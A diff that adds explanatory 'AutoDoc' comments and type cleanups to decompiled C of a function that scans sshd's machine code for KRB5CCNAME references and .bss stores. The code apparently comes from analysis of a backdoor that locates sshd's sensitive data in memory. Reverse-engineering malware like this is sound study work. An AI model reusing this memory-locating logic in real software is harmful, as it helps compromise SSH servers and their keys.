@@ -31,9 +31,10 @@ BOOL sshd_get_sensitive_data_address_via_krb5ccname
   dasm_ctx_t store_scan_ctx;
   
   zero_seed = 0;
+  // AutoDoc: Clear the primary decoder context before walking the KRB5CCNAME references so the register tracker starts with zeroed state.
   zero_ctx_cursor = &string_scan_ctx;
   for (clear_idx = 0x16; clear_idx != 0; clear_idx = clear_idx + -1) {
-    *(undefined4 *)&zero_ctx_cursor->instruction = 0;
+    *(u32 *)&zero_ctx_cursor->instruction = 0;
     zero_ctx_cursor = (dasm_ctx_t *)((long)&zero_ctx_cursor->instruction + 4);
   }
   *sensitive_data_out = (void *)0x0;
@@ -86,9 +87,10 @@ LAB_0010345d:
                 if (dest_reg != tracked_reg) goto LAB_001033d1;
               }
 LAB_0010346b:
+              // AutoDoc: Reuse the same wipe when scanning the follow-on MOV/LEA window so every `.bss` candidate is decoded with fresh state.
               zero_ctx_cursor = &store_scan_ctx;
               for (clear_idx = 0x16; clear_idx != 0; clear_idx = clear_idx + -1) {
-                *(undefined4 *)&zero_ctx_cursor->instruction = 0;
+                *(u32 *)&zero_ctx_cursor->instruction = 0;
                 zero_ctx_cursor = (dasm_ctx_t *)((long)zero_ctx_cursor + (ulong)zero_seed * -8 + 4);
               }
               // AutoDoc: After spotting the getenv result, walk the next few instructions looking for stores into `.bss`.
